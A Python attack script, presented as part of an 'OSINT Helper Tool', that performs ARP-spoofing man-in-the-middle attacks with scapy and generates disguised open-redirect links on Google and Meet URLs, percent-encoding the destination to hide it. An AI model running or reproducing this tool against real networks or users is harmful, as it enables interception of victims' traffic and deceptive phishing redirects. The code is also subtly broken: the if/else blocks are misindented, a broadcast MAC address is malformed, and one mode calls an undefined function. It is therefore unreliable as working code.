
# This is part from OHT (OSINT Helper Tool)Tool

import os,sys

oscheck1 = os.system('cls') # Check Platform
if oscheck1==0:
    cpt = True
else:
    cpt =  False
    _=os.system('clear')

# Import Packages
import random,argparse
from colorama import Fore
from scapy.all import *

# Import Arguments
arg = argparse.ArgumentParser()
arg.add_argument("--mitm",help='Man in the middle attacks',action='store_true',dest='mimt',default=False,required=False)
arg.add_argument("--vur",help='Vulnerable url redirector',action='store_true',dest='vur',default=False,required=False)
arg.add_argument("--fsa",help='Finding account with the same name',action='store_true',dest='fsa',default=False,required=False)
arg = arg.parse_args()

# Check
if not arg.mimt:
    if not arg.vur:
        if not cpt:
                sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Please select an attack')
            else:
                sys.exit('[ERR] Please select an attack')
    if arg.fsa:
        if not cpt:
                sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Please select an attack')
            else:
                sys.exit('[ERR] Please select an attack')

if arg.vur:
    if arg.mimt:
        if not cpt:
                sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Please select an attack')
            else:
                sys.exit('[ERR] Please select an attack')
    if arg.fsa:
        if not cpt:
                sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Please select an attack')
            else:
                sys.exit('[ERR] Please select an attack')

# Preparing
token = ['Q','w','E','r','T','y','U','i','O','p','A','s','D','f','G','h','J','k','L','z','X','c','V','b','N','m','q','W','e','R','t','Y','u','I','o','P','a','S','d','F','g','H','j','K','l','Z','x','C','v','B','n','M','1','0','2','9','3','8','4','7','5','6']
ifcs = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
keys = ['%61','%62','%63','%64','%65','%66','%67','%68','%69','%6A','%6B','%6C','%6D','%6E','%6F','%70','%71','%72','%73','%74','%75','%76','%77','%78','%79','%7A']

vulhurl = [
    'https://asia.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'http://blogsearch.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'http://clients1.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'http://images.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'http://mail.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'http://map.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'http://www.google.com/search?btnI&tokens=TOKEN_HERE&q=',
    'https://meet.google.com/linkredirect?tokens=TOKEN_HERE&dest='
    ]

def encrypt(a):
    for key in range(len(keys)):
        a = a.replace(ifcs[key],keys[key])
    return a

def randToken():
    a = random.randint(75,80)
    b = []
    e = ''
    for i in range(a):
        c = random.randrange(len(token))
        b.append(token[c])
    for i in range(0,len(b)):
        e = e+b[i]
    return e

def restore():
    print('Restoring...')
    send(ARP(op=2, pdst=gatewayIP, psrc=targetIP, hwdst = 'ff:ff:ff:ff:ff', hwsrc=targetMAC),count=10,verbose=False)
    send(ARP(op=2, pdst=targetIP, psrc=gatewayIP, hwdst = 'ff:ff:ff:ff:ff', hwsrc=gatewayMAC),count=10,verbose=False)
    sys.exit()

def mitm():
    send(ARP(op=2, pdst=targetIP, psrc=gatewayIP, hwdst = targetMAC),verbose=False)
    send(ARP(op=2, pdst=gatewayIP, psrc=targetIP, hwdst = gatewayMAC),verbose=False)

if arg.mimt:
    targetIP = input('Target IP : ')
    gatewayIP = input('Gateway IP : ')
    targetMAC = getmacbyip(targetIP)
    gatewayMAC = getmacbyip(gatewayIP)
    try:
        while True:
            mitm()
            time.sleep(1.5)
    except KeyboardInterrupt:
        restore()

elif arg.vur:
    print('''
Option :

[1] https://asia.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[2] http://blogsearch.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[3] http://clients1.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[4] http://images.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[5] http://mail.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[6] http://map.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[7] http://www.google.com/search?btnI&tokens=TOKEN_HERE&q={}
[8] https://meet.google.com/linkredirect?tokens=TOKEN_HERE&dest={}    
''')
    opt = int(input('Option : '))
    if opt > len(vulhurl):
        if not cpt:
            sys.exit('['+Fore.RED+'ERR'+Fore.RESET+'] Unknown Option')
        else:
            sys.exit('[ERR] Unknown Option')
    url = input('URL :')
    url = (vulhurl[opt-1]+encrypt(url)).replace('TOKEN_HERE', randToken())
    if not cpt:
        print('['+Fore.GREEN+'INF'+Fore.RESET+'] Output : '+url)
    else:
        print('[INF] Output : '+url)

elif arg.fsa:
    acn = input('Account Name : ')
    afind(acn)
    
